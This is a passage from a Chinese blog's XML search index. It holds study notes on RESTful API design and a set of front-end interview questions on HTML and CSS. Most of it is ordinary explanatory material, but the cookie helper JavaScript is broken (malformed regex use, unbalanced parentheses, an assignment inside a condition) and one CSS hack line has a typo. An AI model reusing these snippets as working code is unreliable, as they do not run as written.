        <tag>javaScript数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入理解RESTful]]></title>
    <url>%2F2018-10-26-RESTful.html</url>
    <content type="text"><![CDATA[通过阅读阮一峰老师的两篇文章，进行笔记的抄录，来加深自己对于 RESTful的理解 深入理解RESTfulRESTful 架构是目前最流行的一种互联网软件架构，它结构清晰、符合标准、易于理解、扩展方便，所以得到越来越多网站的采用。那么，到底什么叫做 RESTful 架构呢？ RESTful 架构起源REST这个词，是Roy Thomas Fielding在他2000年的博士论文中提出的。 名称Fielding将他对互联网软件的架构原则，定名为REST，即Representational State Transfer的缩写。我对这个词组的翻译是”表现层状态转化”。 资源（Resources）REST的名称”表现层状态转化”中，省略了主语。”表现层”其实指的是”资源”（Resources）的”表现层”。 所谓的“资源”，就是网络上的一个实体，或者说是网络上的一个具体信息，它可以是一段文本、一张图片，一首歌，一种服务，总之就是一个具体的存在。可以用一个 URI （统一资源定位符）指向它，每种资源对应一个特定的 URI ，要获取这个资源，访问它的 URI 就可以，因而 URI 就成了每一个资源的地址或者收拾独一无二的识别符。 表现层（Representation）“资源”是一种消息实体，可以有多种外在表现形式，把“资源”具体呈现出来的形式，叫做它的“表现层” 例如：文本可以用 txt 格式表现，也可以用 HTML 格式、XML 格式、JSON 格式表现，甚至可以采用二进制格式，图片可以用 JPG 格式表现，也可以用 PNG 格式表现。 URI 只代表资源的实体，不代表它的形式，严格地说，有些网站最后的“.html”后缀名是不必要的，因为这个后缀名表示格式，属于“表现层”的范畴，而 URI 应该只代表“资源”的位置。它的具体表现形式，应该在 HTTP 请求的头部信息中用 Accept 和 Content-Type 字段来指定，这两个字段才是对“表现层”的描述。 状态转化（state Transfer）访问一个网站，就代表了客户端和服务器的一个互动的过程，在这个过程中，就会涉及到数据和状态的变化。 互联网通信协议 HTTP 协议，是一个无状态协议。这意味着，所有的状态都保存在服务器端，因此，如果客户端想要操作服务器，必须通过某种手段，让服务器端发生“状态转化（State Transfer）” 。而这种转化是建立在表现层之上的，所以就是“表现层状态转化” 客户端用到的手段，只能是 HTTP 协议，具体来说，就是 HTTP 协议里面，四个表示操作的动词： GET/POST/PUT/DELETE。它们分别对应四种基本操作：获取/新建（更新）/更新/删除 资源 综述RESTful 就是 每一个 URI 代表一个资源 客户端与服务器之间，传递这种资源的某种表现层 客户端通过四个 HTTP 动词，对服务端资源进行操作，实现”表现层状态转化“ 误区RESTful 架构有一些典型的设计误区 最常见的设计误区，就是 URI 中包含动词。因为“资源”是一种实体，所以应该是名称，URI 不应该有动词，动词应该放在 HTTP 协议中。 例子： URI: /posts/show/1 其中 show 是动词，这个 URI 设计就错误了，正确的应该是 URI: /posts/1 然后用 GET 表示 show 如果某些动作是HTTP动词表示不了的，你就应该把动作做成一种资源。比如网上汇款，从账户1向账户2汇款500元，错误的URI是： 1POST /accounts/1/transfer/500/to/2 正确的写法是把动词transfer改成名词transaction，资源不能是动词，但是可以是一种服务： 123POST /transaction HTTP/1.1Host: 127.0.0.1from=1&amp;to=2&amp;amount=500.00 另一个设计误区，就是在URI中加入版本号： http://www.example.com/app/1.0/foo http://www.example.com/app/1.1/foo http://www.example.com/app/2.0/foo 因为不同的版本，可以理解成同一种资源的不同表现形式，所以应该采用同一个URI。版本号可以在HTTP请求头信息的Accept字段中进行区分（参见Versioning REST Services）： Accept: vnd.example-com.foo+json; version=1.0 Accept: vnd.example-com.foo+json; version=1.1 Accept: vnd.example-com.foo+json; version=2.0 RESTful API 最佳实践URI 设计动词 + 宾语 RESTful 的 核心思想就是，客户端发出的数据操作指令都是 “动词+宾语”的结构，比如 GET/articles这个命令，GET是动词，/articles是宾语 动词通常就是五种 HTTP 方法，对应 CRUD（Create增加|Retrieve读取查询|Update更新|Delete删除） 操作 GET ：读取（Read） POST：新建（Create） PUT：更新（Update） PATCH：更新（Update），通常是部分更新 DELETE：删除（Delete） 根据 HTTP 规范，动词一律大写。 动词的覆盖 有些客户端只能使用 GET和 POST这两种方法，服务器必须接受 POST模拟其他三个方法（PUT、PATCH、DELETE） 这时客户端发出的 HTTP 请求，要加上 X-HTTP-Method-Override属性，告诉服务器应该使用哪一个动词，覆盖 POST方法 12POST /api/Person/4 HTTP/1.1X-HTTP-Method-Override: PUT 上面代码中，X-HTTP-Method-Override指定本次请求的方法是PUT，而不是POST。 宾语必须是名词 宾语就是 API 的URI ，是 HTTP 动词作用的对象，它应该是名词，不能是动词，比如 /articles这个 URL 就是正确的，而下面的 URL 不是名词，所以都是错误的 /getAllCars /createNewCar /deleteAllRedCars 复数 URL 既然 URL 是名词，那么应该使用复数，还是单数？ 这没有统一的规定，但是常见的操作是读取一个集合，比如GET /articles（读取所有文章），这里明显应该是复数。 为了统一起见，建议都使用复数 URL，比如GET /articles/2要好于GET /article/2。 避免多级 URL 常见的情况是，资源需要多级分类，因此很容易写出多级的 URL，比如获取某个作者的某一类文章。 1GET /authors/12/categories/2 这种 URL 不利于扩展，语义也不明确，往往要想一会，才能明白含义。 更好的做法是，除了第一级，其他级别都用查询字符串表达。 1GET /authors/12?categories=2 下面是另一个例子，查询已发布的文章。你可能会设计成下面的 URL。 1GET /articles/published 查询字符串的写法明显更好。 1GET /articles?published=true 状态码状态码必须精确 客户端的每一次请求，服务器都必须给出回应。回应包括 HTTP 状态码和数据两部分。 HTTP 状态码就是一个三位数，分成五个类别。 1xx：相关信息 2xx：操作成功 3xx：重定向 4xx：客户端错误 5xx：服务器错误 2xx 状态码 200状态码表示操作成功，但是不同的方法可以返回更精确的状态码。 GET: 200 OK POST: 201 Created PUT: 200 OK PATCH: 200 OK DELETE: 204 No Content 上面代码中，POST返回201状态码，表示生成了新的资源；DELETE返回204状态码，表示资源已经不存在。 此外，202 Accepted状态码表示服务器已经收到请求，但还未进行处理，会在未来再处理，通常用于异步操作。下面是一个例子。 12345678HTTP/1.1 202 Accepted&#123; "task": &#123; "href": "/api/company/job-management/jobs/2130040", "id": "2130040" &#125;&#125; 3xx 状态码 API 用不到301状态码（永久重定向）和302状态码（暂时重定向，307也是这个含义），因为它们可以由应用级别返回，浏览器会直接跳转，API 级别可以不考虑这两种情况。 API 用到的3xx状态码，主要是303 See Other，表示参考另一个 URL。它与302和307的含义一样，也是”暂时重定向”，区别在于302和307用于GET请求，而303用于POST、PUT和DELETE请求。收到303以后，浏览器不会自动跳转，而会让用户自己决定下一步怎么办。下面是一个例子。 12HTTP/1.1 303 See OtherLocation: /api/orders/12345 4xx 状态码 4xx状态码表示客户端错误，主要有下面几种。 400 Bad Request：服务器不理解客户端的请求，未做任何处理。 401 Unauthorized：用户未提供身份验证凭据，或者没有通过身份验证。 403 Forbidden：用户通过了身份验证，但是不具有访问资源所需的权限。 404 Not Found：所请求的资源不存在，或不可用。 405 Method Not Allowed：用户已经通过身份验证，但是所用的 HTTP 方法不在他的权限之内。 410 Gone：所请求的资源已从这个地址转移，不再可用。 415 Unsupported Media Type：客户端要求的返回格式不支持。比如，API 只能返回 JSON 格式，但是客户端要求返回 XML 格式。 422 Unprocessable Entity ：客户端上传的附件无法处理，导致请求失败。 429 Too Many Requests：客户端的请求次数超过限额。 5xx 状态码 5xx状态码表示服务端错误。一般来说，API 不会向用户透露服务器的详细信息，所以只要两个状态码就够了。 500 Internal Server Error：客户端请求有效，服务器处理时发生了意外。 503 Service Unavailable：服务器无法处理请求，一般用于网站维护状态。 服务器回应不要返回纯本文 API 返回的数据格式，不应该是纯文本，而应该是一个 JSON 对象，因为这样才能返回标准的结构化数据。所以，服务器回应的 HTTP 头的Content-Type属性要设为application/json。 客户端请求时，也要明确告诉服务器，可以接受 JSON 格式，即请求的 HTTP 头的ACCEPT属性也要设成application/json。下面是一个例子。 12GET /orders/2 HTTP/1.1Accept: application/json 发生错误时，不要返回 200 状态码 有一种不恰当的做法是，即使发生错误，也返回200状态码，把错误信息放在数据体里面，就像下面这样。 123456789HTTP/1.1 200 OKContent-Type: application/json&#123; "status": "failure", "data": &#123; "error": "Expected at least two items in list." &#125;&#125; 上面代码中，解析数据体以后，才能得知操作失败。 这张做法实际上取消了状态码，这是完全不可取的。正确的做法是，状态码反映发生的错误，具体的错误信息放在数据体里面返回。下面是一个例子。 123456789HTTP/1.1 400 Bad RequestContent-Type: application/json&#123; "error": "Invalid payoad.", "detail": &#123; "surname": "This field is required." &#125;&#125; 提供链接 API 的使用者未必知道，URL 是怎么设计的。一个解决方法就是，在回应中，给出相关链接，便于下一步操作。这样的话，用户只要记住一个 URL，就可以发现其他的 URL。这种方法叫做 HATEOAS。 举例来说，GitHub 的 API 都在 api.github.com 这个域名。访问它，就可以得到其他 URL。 123456789&#123; ... "feeds_url": "https://api.github.com/feeds", "followers_url": "https://api.github.com/user/followers", "following_url": "https://api.github.com/user/following&#123;/target&#125;", "gists_url": "https://api.github.com/gists&#123;/gist_id&#125;", "hub_url": "https://api.github.com/hub", ...&#125; 上面的回应中，挑一个 URL 访问，又可以得到别的 URL。对于用户来说，不需要记住 URL 设计，只要从 api.github.com 一步步查找就可以了。 HATEOAS 的格式没有统一规定，上面例子中，GitHub 将它们与其他属性放在一起。更好的做法应该是，将相关链接与其他属性分开。 12345678910HTTP/1.1 200 OKContent-Type: application/json&#123; "status": "In progress", "links": &#123;[ &#123; "rel":"cancel", "method": "delete", "href":"/api/status/12345" &#125; , &#123; "rel":"edit", "method": "put", "href":"/api/status/12345" &#125; ]&#125;&#125; 想了解更多详情的，可以点击 RESETful API 设计规范 我所理解的RESTful Web API [Web标准篇] 我所理解的RESTful Web API [设计篇] 参考链接 理解RESTful架构-阮一峰 RESTful API 最佳实践]]></content>
      <categories>
        <category>RESTful</category>
      </categories>
      <tags>
        <tag>RESTful</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试题目汇总摘录（HTML 和 CSS篇）]]></title>
    <url>%2F%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB%E6%91%98%E5%BD%95-HTML%20%E5%92%8C%20CSS%E7%AF%87.html</url>
    <content type="text"><![CDATA[温故而知新，保持空杯心态 HTML 和 CSS你做的页面在哪些浏览器测试过？这些浏览器的内核分别是什么 浏览器名称 内核 IE trident Firefox（火狐） gecko Safari webkit Opera 以前是 presto ，现在已改用 Google Chrome 的 Blink 内核 Chrome（谷歌） Blink（基于 webkit，Google 与 Opera Software 共同开发） 每个 HTML 文件里开头都有个重要的东西， Doctype,知道这个是干什么的吗？&lt;! DOCTYPE&gt; 声明位于文档中的最前面的位置，处于 &lt;html&gt; 标签之前，此标签可以告知浏览器文档使用哪种 HTML 或 XHTML 规范。（重点：告诉浏览器按照哪种规范解析页面） Quirks 模式是什么？它和 Standards 模式有什么区别？从 IE6 开始，引入了 Standards 模式，标准模式中，浏览器尝试符合标准的文档在规范上的正确处理达到在指定浏览器中的程度。 在IE6 之前 CSS 还不够成熟，所以 IE5 等之前的浏览器对 CSS 的支持很差，IE6 将对 CSS 提供更好的支持，然后这时问题就来了，因为有很多页面是基于旧的的布局方式写的，如果 IE6 支持 CSS 则将这些页面显示不正常，如何在即保证不破坏现有页面，又提供新的渲染机制？ 在写程序时我们也会经常遇到这样的问题，如何保证原来的接口不变，提供更强大的功能，尤其是新功能不兼容旧功能的时候。遇到这种问题时的一个常见的做法就是增加参数和分支，即当某个参数为真，我们就使用新的功能，如果这个参数不为真的时候，就使用旧的功能，这样就可以不破坏原来的程序，又能提供新的功能。IE6 也是类似这样做，它将 DTD 当成了 这个参数，因为当前的页面大家都不会去写 DTD ，所以 IE6 就假定如果写了 DTD 就意味着这个页面将采用对 CSS 支持更好的布局，而如果没有，就采用兼容之前的布局方式，这就是 Quirks 模式（怪癖模式，诡异模式，怪异模式） 实例： 123&lt;!DOCTYPE html&gt;&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd" &gt;&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt; 第一种：表明该页面是遵守了 HTML5 规范的，浏览器会选择 Standards Mode ，这种 doctype 是最推荐的一种。 第二种：浏览器同样会选择 Standards Mode ,虽然第一种 doctype 有一些区别，但几乎可以认为是一样的 第三种：浏览器会选择 Almost Standards Mode ，需要注意的是乳沟今后需要把这个页面重新改写成 HTML5 规范，那么 table 标签中的分割图片问题可能会被错乱。 当 doctype 缺失（不注明、写错）时候，浏览器会选择 Quirks Mode,这是非常不推荐的方式，我们应该尽量避免 Quirks Mode 区别： 总体会有布局、样式解析和脚本执行三个方面的区别。 早期的 IE 浏览器（IE 6 以前）将盒子的 padding 和 border 算到了盒子的尺寸中，这一模型被称为 IE 盒模型。在 IE 盒模型中 box width = content width + padding left + padding right + border left + border right box width = content width + padding left + padding right + border left + border right 而在 W3C 标准的盒模型中，box 的大小就是 content 的大小 box width = content width，box height = content height 这一区别将导致页面绘制时所有的块级元素都出现很大的差别，所以两种不同的文档模式下的页面也区别很大。 设置行内元素的高宽，在 Standards 模式下，给 &lt;span&gt; 等行内元素设置 width 和 height 都不会生效，而在 quirks 模式下，会生效。 设置百分比的高度，在 Standards 模式下，一个元素的高度是由其包含的内容来决定的，如果父元素没有设置百分比的高度，子元素设置了一个百分比的高度是无效用的。 margin:0 auto 设置水平居中，使用 margin:0 auto 在 standards 模式下可以使元素水平 居中，但在 quirks 模式下却会失效。 在Quirks Mode下，为body设置一个margin是无效的。 默认情况下，IE有一个垂直滚动条，尽管当没有东西可以滚动的时候，它是非活动状（迟钝状态），在Quirks Mode下，你可以通过设置body { overflow: auto;}删除它（当不需它的时候），但是在标准模式下，你仍然需要增加html { overflow: auto;} 默认的浮动图片的水平margin是3像素（而不是0）。 字体属性不会从body或其他封闭元素继承到table中。特别是font-size。字体，颜色，行高也都有可能。 （还有很多，答出什么不重要，关键是看他答出的这些是不是自己经验遇到的，还是说都是看文章看的，甚至完全不知道。） div+css 的布局较 table 布局有什么优点 改版的时候更方便，只要改css 文件 页面加载速度更快、结构化清晰、页面显示简洁 表现与结构相分离 易于优化（seo）搜索引擎更加友好，排名更容易靠前 img 的 alt 与 title 有何异同？strong 与 em 的异同alt （alt text）：为不能显示图像、窗体或 applets 的用户代理（UA），alt属性用来指定替换文字。替换文字的语言由lang 属性指定。（在 IE 浏览器下会在没有 title 时把 alt 当成 tool tip 显示） title （tool tip）: 该属性为设置该属性的元素提供建议性的消息 strong：粗体强调标签，强调，表示内容的重要性 em：斜体强调标签，更强烈强调，表示内容的强调点 描述一下渐进增强与优雅降级之间的不同渐进增强（progressive enhancement）：针对低版本浏览器进行构建页面，保证最基本的功能，然后再针对高级浏览器进行效果、交互等改进和追加功能达到更好的用户体验。 优雅降级 （graceful degradation）：一开始就构建完整的功能，然后再针对低版本浏览器进行兼容 区别：优雅降级是从复杂的现状开始，并试图减少用户体验的攻击，而渐进增强则是从一个非常基础的，能够器作用的版本开始，并不断扩充，以适应未来环境的需要。降级（功能衰减）意味着往回看；而渐进增强则意味着朝前看，同时保证其根基处于安全地带。 “优雅降级”观点 “优雅降级”观点认为应该针对那些最高级、最完善的浏览器来设计网站。而将那些被认为“过时”或有功能缺失的浏览器下的测试工作安排在开发周期的最后阶段，并把测试对象限定为主流浏览器前的一个版本。 在这种设计范例下，旧版的浏览器被认为仅能提供“简陋却无妨（poor,but passable）” 的浏览体验，可以做一些小的调整来适应某个特定的浏览器。但由于它们并非我们所关注的焦点，因此除了修复较大的错误之外，其他的差异将被直接忽略。 “渐进增强”观点 “渐进增强”观点则认为应关注于内容本身 内容是我们建立网站的诱因。有的网站展示它，有的则收集它，有点寻求，有的操作，还有的网站甚至会包含以上的种种，但相同点是它们全都涉及到了内容。这使得“渐进增强“成为了一种更为合理的设计范例。这也是它立即被 Yahoo! 所采纳并用以构建其”分级式浏览器支持“策略的原因所在 可以利用多个域名来存储网站资源会更有效？ CDN 缓存更方便 突破浏览器并发限制 节约 cookie 带宽 节约主域名的连接数，优化页面响应速度 防止不必要的安全问题 对网页标准和标准制定机构重要性的理解网页标准和标准制定机构都是为了能让 web 发展的更 “健康”，开发者遵循了统一的标准，降低开发难度，开发成本，SEO 也会更好做，也不会因为滥用代码导致各种 BUG 、安全问题,最终提高网站易用性。 描述一下 cookies，sessionStorage 和 localStorage 的区别sessionStorage （session）中的数据，这些数据只有在同一个会话中的页面才能访问并且当会话结束后数据也随之销毁。因为 sessionStorage 不是一种持久化的本地存储，仅仅是会话级别的存储。而 localStorage 用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。 web storage 和 cookie 的区别 Web Storage 的概念和 cookie 相似，区别是它是为了更大容量存储设计的。Cookie 的大小是受限的，并且每次你请求一个新的页面的时候 Cookie 都会被发送过去，这样无形中浪费了带宽，另外 cookie 还需要指定作用域，不可以跨域调用。 除此之外，Web Storage 拥有 setItem,getItem,removeItem，clean 等方法，不像 cookie 需要前端开发者自己封装 setCookie,getCookie，但是 Cookie 也不是不可以或缺的：Cookie 的作用是与服务器进行交互，作为 HTTP 规范的一部分存在，而 Web Storage 仅仅是为了在本地“存储”数据而生。 前端设置用户设置，获取，清空 Cookie 1234567891011121314151617181920212223242526// 写 cookies function setCookie()&#123; var Days = 30; var exp = new Date(); exp.setTime(exp.getTime() + Days*24*60*60*1000); document.cookie = name + "=" + encodeURIComponent(value) + "；expires=" + exp.toGMTString();&#125;// 读取 cookiesfunction getCookie(name)&#123; var arr,reg = new RegExp("(^|)" + name + "+([^;]*)(;|$)"); if(arr.document.cookie.match(reg) return decodeURIComponent(arr[2]); else return null;&#125;//删除 cookiesfunction delCookie(name)&#123; var exp = new Date(); exp.setTime(exp.getTime() - 1); var cval = getCookie(name); if(!cval = null)&#123; document.cookie = name + "=" + cval + ";expires" + exp.toGMTString(); &#125;&#125; 简述一下 src 与 href 的区别src 用于替换当前元素， href 用于在当前文档和应用资源之间建立联系。 src 是 srouce 的缩写，指向外部资源的位置，指向的内容和将会嵌入到文档中当前标签所在位置，在请求 src 资源时会将其指向的资源下载并应用到文档内，例如 js 脚本，img 图片和frame 等元素。 1&lt;script src = "js.js"&gt;&lt;/script&gt; 当浏览器解析到该元素时，会暂停其他资源的下载和处理，直到将该资源加载、编译、执行完毕，图片和框架等元素也是如此，类似于将所指向资源嵌入当前标签内，这也是为什么将js脚本放在底部而不是头部。 href 是 Hypertext Reference 的缩写，指向网络资源所在的位置，建立和当前元素（锚点）或当前文档（链接）之间的链接，如果在文档中添加 1&lt;link href = "common.css" rel="stylesheet"/&gt; 那么浏览器会识别该文档为 css 文件，就会并行下载资源并且不会停止对当前文档的处理。这也是为什么建议使用link 方式来加载 css,也不是使用 @import 方式 网页制作会用到的图片格式有哪些？png-8,png-24,jpeg,gif,svg 希望听到的是 Webp(是否有关注新鲜技术)，WebP,谷歌开发的一种旨在加快图片加载速度的图片格式。图片压缩体积大约只有 JPEG 的 2/3 ，并能节省大量的服务器带宽资源和数据空间。Facebook Ebay 等知名网站已经开始测试并使用 WebP 格式。在质量相同的情况下，WebP格式图像的体积要比 JPEG 格式图像小 40% 支持情况：谷歌浏览器已经支持webp格式，Opera在版本号Opera11.10后也增加了支持，然而火狐和ie暂时还不支持webp格式，可以采用flash插件来显示webp，当然这样会耗费一些性能。 美中不足的是，WebP格式图像的编码时间“比JPEG格式图像长8倍”。 详细可以点击 都说 WebP 厉害，究竟厉害在哪里？ 知道什么是微格式(microformat)？谈谈理解，在前端构建中应该考虑微格式吗？微格式（Microformats） 是一种让机器可读的语义化 XHTML 词汇的集合，是结构化数据的开放标准。是为特殊应用而制定的特殊格式。 优点：将智能数据添加到网页上，让网站内容在搜索引擎结果界面可以显示额外的提示。（应用范例：豆瓣） 微格式在实际应用中的意义和作用 在捉取Web内容时，能够更为准确地识别内容块的语义； 对内容进行操作，包括提供访问、校对，还可以将其转化成其他的相关格式，提供给外部程序和Web服务使用 实例： 1234// 以前写链接到首页的代码&lt;a href = "http://laibh.top"&gt;赖同学&lt;/a&gt;// 现在为a标签加上rel属性,标记a包括rel=”homepage”属性，该属性显示链接的目标页面是该网站的首页。通过为已有的链接元素添加语义化属性，就为这个链接添加了具体的结构和意义。&lt;a href = "http://laibh.top" rel = "homepage"&gt;赖同学&lt;/a&gt; hCard 微格式hCard是一种微格式，用来发布个人，公司，组织，地点等详细的联系信息。 它可以使分析器（比如其他网站，Firefox的Operator插件）获得详细的信息，并通过别的网站或者地图工具进行显示，或者载入到地址簿等其他程序。 实例： 1234567891011121314&lt;div&gt; &lt;div&gt;赖同学&lt;/div&gt; &lt;div&gt;某某公司&lt;/div&gt; &lt;div&gt;电话：xxx-xxx-xxx&lt;/div&gt; &lt;a href = "http://laibh.top"&gt;赖同学的网站&lt;a&gt;&lt;/div&gt; // 加入微格式后 &lt;div class = "vcard"&gt; &lt;div class = "fn"&gt;赖同学&lt;/div&gt; &lt;div class = "org"&gt;某某公司&lt;/div&gt; &lt;div class = "tel"&gt;电话：xxx-xxx-xxx&lt;/div&gt; &lt;a class = "url" href = "http://laibh.top"&gt;赖同学的网站&lt;a&gt;&lt;/div&gt; 这里，正式名称（class=”fn”），组织（class=”org”），电话号码（class=”tel”）和url（class=”url”）分别用相应的class标示；同时，所有内容都包含在class=”vcard”里。 目前看来，这似乎是一件费力不讨好的事情，因为 hCard 等微格式尚未得到浏览器和终端设备的良好支持。但是一旦这些不足得到了改善，hCard 就会为我们的数字生活带来很大的便利。 在 css/js 代码上线后之后开发人员经常会优化性能，从用户刷新网页开始，一次 js 请求一般情况下有哪些地方会有缓存处理？dns缓存：短时间内多次访问某个网站，在限定时间内，不用多次访问DNS服务器。 cdn缓存：内容分发网络 浏览器缓存：浏览器在用户磁盘上，对最新请求过的文档进行了存储。 服务器缓存：将需要频繁访问的Web页面和对象保存在离用户更近的系统中，当再次访问这些对象的时候加快了速度。 另外 ，关于更新发布CSS和JS文件的缓存问题 上文大概解决的思路：js文件的内容修改了,可以加个t参数表明一下日期,用这个日期来作为版本号，看到日期也能知道是哪天发布的，没有修改js文件就不用修改日期。 一个页面上有大量图片（大型电商网站），加载很慢，有哪些方法优化这些图片的加载，给用户更好的体验图片懒加载，在页面上的未可视区域添加一个滚动事件，判断图片位置与浏览器顶端的距离与页面距离，如果前者小于后者，优先加载 如果为幻灯片、相册等，可以使用图片预加载技术，将当期的展示图片的前一张和后一张优先加载。 如果图片为css图片。可以使用 CSSsprite,SVGsprite,Iconfont,Base64等技术。 如果图片过大，可以使用特殊编码的图片，加载时会先加载一张压缩的特别厉害的缩略图，以提高用户体验。 如果图片展示区域小于图片的真实大小，则因在服务端根据业务需要先进行图片压缩，图片压缩后大小与展示一致。 如果去理解 HTML 结构的语义化 为了去掉或样式丢失的时候能让页面呈现清晰的结构 屏幕阅读器（如果访客有视障）会完全根据你的标记来“读”你的网页. PDA/手机等设备可能无法像普通电脑的浏览器一样来渲染网页（通常是因为这些设备对css支持较弱） 搜索引擎的爬虫也依赖于标记来确定上下文和各个关键字的权重，有利于SEO，和搜索引擎建立良好沟通 便于团队开发和维护。遵循W3C标准的团队，可以减少很多差异化的东西，方便开发维护，提高效率，甚至实现模块化开发。 以前端角度出发做好SEO 需要考虑什么？了解搜索引擎如何抓取网页和如何索引网页 需要知道一些搜索引擎的基本工作原理，各个搜索引擎之间的区别，搜索机器人（SEO robot 或叫 web crawler）如何进行工作，搜索引擎如何对搜索结果进行排序等等。 Meta标签语义化主要包括主题（Title）,网站描述（Description）和关键词（Keywords），还有一些其他隐藏文字比如作者（AuThor）,目录（Category）,编码语种（Language）等 如何选择关键词并在网页中放置关键词搜索就得用关键词，关键词分析和选择是SEO的最重要的工作之一，首先要给网站确定主关键词（一般是5个上下），然后针对这些关键词进行优化，包括关键词密度（Density），相关度（Relavancy），突出性（Prominency）等等。 了解主要的搜索引擎虽然搜索引擎有很多，但是对网站流量起决定作用的就那么几个。比如英文的主要有Google，Yahoo，Bing 等；中文的有百度，搜狗，有道等。不同的搜索引擎对页面的抓取和索引、排序的规则都不一样。还要了解各搜索门户和搜索引擎之间的关系，比如 AOL 网页搜索用的是 Google 的搜索技术，MSN 用的是 Bing 的技术。 主要的互联网目录Open Directory 自身不是搜索引擎，而是一个大型的网站目录，他和搜索引擎的主要区别是网站内容的收集方式不同。目录是人工编辑的，主要收录网站主页；搜索引擎是自动收的，除了主页外还抓取大量的内容页面。 按点击付费的搜索引擎搜索引擎也需要生存，随着互联网商务的越来越成熟，收费的搜索引擎也开始大行其道。最典型的有 Overture 和百度，当然也包括 Google 的广告项目 Google Adwords。越来越多的人通过搜索引擎的点击广告来定位商业网站，这里面也大有优化和排名的学问，你得学会用最少的广告投入获得最多的点击。 搜索引擎登录网站做完了以后，别躺在那里等着客人从天而降。要让别人找到你，最简单的办法就是将网站提交（submit）到搜索引擎。如果你的是商业网站，主要的搜索引擎和目录都会要求你付费来获得收录（比如 Yahoo 要 299 美元），但是好消息是（至少到目前为止）最大的搜索引擎 Google 目前还是免费，而且它主宰着 60％以上的搜索市场。 链接交换和链接广泛度（Link Popularity）网页内容都是以超文本（Hypertext）的方式来互相链接的，网站之间也是如此。除了搜索引擎以外，人们也每天通过不同网站之间的链接来 Surfing（“冲浪”）。其它网站到你的网站的链接越多，你也就会获得更多的访问量。更重要的是，你的网站的外部链接数越多，会被搜索引擎认为它的重要性越大，从而给你更高的排名。 有哪项方式可以对一个 DOM 设置它的 CSS 样式外部样式表，引入一个 外部 css 文件 内部样式表，将 css 代码直接在放在 &lt;head&gt; 标签内部 内联样式，将 css 样式 直接定义在 HTML 元素内部 CSS都有哪些选择器派生选择器（用 HTML 标签申明） id 选择器（用 DOM 的 ID 申明） 类选择器（用一个样式类名申明） 属性选择器（用 DOM 的属性申明，属于 CSS2，IE6 不支持，不常用，不知道就算了） 除了前 3 种基本选择器，还有一些扩展选择器，包括 后代选择器（利用空格间隔，比如 div .a{ }） 群组选择器（利用逗号间隔，比如 p,div,#a{ }） CSS 选择器的优先级是怎么样定义的？基本原则： 一般而言，选择器越特殊，它的优先级越高。也就是选择器指向的越准确，它的优先级就越高。 important &gt; 内联 &gt; ID &gt; 类 &gt; 标签 | 伪类 | 属性选择 &gt; 伪对象 &gt; 通配符 &gt; 继承 复杂的计算方法：用 1 表示派生选择器的优先级 用 10 表示类选择器的优先级 用 100 标示 ID 选择器的优先级 div.test1 .span var 优先级 1+10 +10 +1 span#xxx .songs li 优先级 1+100 + 10 + 1 #xxx li 优先级 100 +1 CSS 中可以通过哪些属性定义，使得一个DOM 元素不显示在浏览器可视范围内？最基本的：设置 display 属性为 none，或者设置 visibility 属性为 hidden 技巧性：设置宽高为 0，设置透明度为 0，设置 z-index 位置在-1000 超链接访问过后 hover 样式就不出现的问题是什么？如何解决？被点击访问过的超链接样式不在具有 hover 和 active 了,解决方法是改变 CSS 属性的排列顺序: L-V-H-A（link,visited,hover,active） 什么是 CSS hack? ie6,7,8 的 hack 分别是什么？针对不同浏览器写不同的 CSS code 的过程就是 CSS hack。 123456789101112#test&#123; width:300px; height:300px; background-color:blue; /*firefox*/ background-color:red\9; /*all ie*/ background-color:yellow; /*ie8*/ +background-color:pink; /*ie7*/ _background-color:orange; /*ie6*/ &#125;:root #test &#123; background-color:purple\9; &#125; /*ie9*/@media all and (min-width:0px)&#123; #test &#123; background=color:black； &#125;&#125; /*opera*/@media screen and (-webkit-min-device-pixel-ratio:0)&#123; #test &#123; background-color: gray; &#125;&#125; /*Chrome and safari*/ 请用 css 写一个简单的幻灯片效果页面12345678910111213141516171819202122232425.ani&#123; width: 480px; height: 320px; margin: 50px auto; overflow: hidden; box-shadow: 0 0 5px rgba(0,0,0,1); background-size: cover; background-position: center; -webkit-animation-name:"loops"; -webkit-animation-duration:20s; -webkit-animation-iteration-count:infinite;&#125;@-webkit-keyframes "loops" &#123; 0%&#123; background:url(http://d.hiphotos.baidu.com/image/w%3D400/sign=c01e6adca964034f0fcdc3069fc27980/e824b899a9014c08e5e38ca4087b02087af4f4d3.jpg) no-repeat; &#125; 25%&#123; background:url(http://b.hiphotos.baidu.com/image/w%3D400/sign=edee1572e9f81a4c2632edc9e72b6029/30adcbef76094b364d72bceba1cc7cd98c109dd0.jpg) no-repeat; &#125; 50%&#123; background:url(http://b.hiphotos.baidu.com/image/w%3D400/sign=937dace2552c11dfded1be2353266255/d8f9d72a6059252d258e7605369b033b5bb5b912.jpg) no-repeat; &#125; 75%&#123; background:url(http://g.hiphotos.baidu.com/image/w%3D400/sign=7d37500b8544ebf86d71653fe9f9d736/0df431adcbef76095d61f0972cdda3cc7cd99e4b.jpg) no-repeat; &#125; 100%&#123; background:url(http://c.hiphotos.baidu.com/image/w%3D400/sign=cfb239ceb0fb43161a1f7b7a10a54642/3b87e950352ac65ce2e73f76f9f2b21192138ad1.jpg) no-repeat; &#125;&#125; 具体代码点击这里 另外一个例子（通过透明度实现） 行内元素和块级元素的具体区别是什么？行内元素的 padding 和 margin 可设置吗？块级元素（block）特性： 总是独占一行，表现为另起一行，而且其后的元素也必须另起一行显示; 宽度（width）、高度（height）、内边距（padding）和外边距（margin）都可以控制 内联元素（inline）特性： 和相邻的内联元素在同一行： 宽度(width)、高度(height)、内边距的 top/bottom(padding-top/padding-bottom)和外边距的 top/bottom(margin-top/margin-bottom)都不可改变（也就是 padding 和 margin 的left 和 right 是可以设置的），就是里面文字或图片的大小。 浏览器还有默认的天生 inline-block 元素（拥有内在尺寸，可设置高宽，但不会自动换行），有哪些？1&lt;input&gt; 、&lt;img&gt; 、&lt;button&gt; 、&lt;texterea&gt; 、&lt;label&gt;。 什么是外边距重叠？重叠的结果是什么？外边距重叠就是 margin-collapse 在 CSS 